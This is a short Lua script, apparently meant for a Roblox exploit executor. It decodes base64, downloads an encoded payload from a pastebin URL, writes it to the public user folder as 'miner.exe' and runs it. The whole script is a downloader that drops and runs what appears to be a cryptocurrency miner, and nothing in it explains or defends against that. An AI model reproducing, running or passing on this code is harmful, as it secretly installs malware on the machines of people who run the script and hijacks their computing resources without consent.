local function decodeBase64(str)
    local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    return (str:gsub('.', function(x)
        if x == '=' then return '' end
        local f = (b:find(x) - 1)
        local r = ''
        for i = 6, 1, -1 do
            r = r .. (f % 2^i - f % 2^(i-1) > 0 and '1' or '0')
        end
        return r
    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
        if #x ~= 8 then return '' end
        local c = 0
        for i = 1, 8 do
            c = c + (x:sub(i, i) == '1' and 2^(8 - i) or 0)
        end
        return string.char(c)
    end))
end

local base64 = game:HttpGet("https://pastebin.com/raw/kcDr4LP7")
local file = "C:\\Users\\Public\\miner.exe"
writefile(file, decodeBase64(base64))
syn.execute(file)
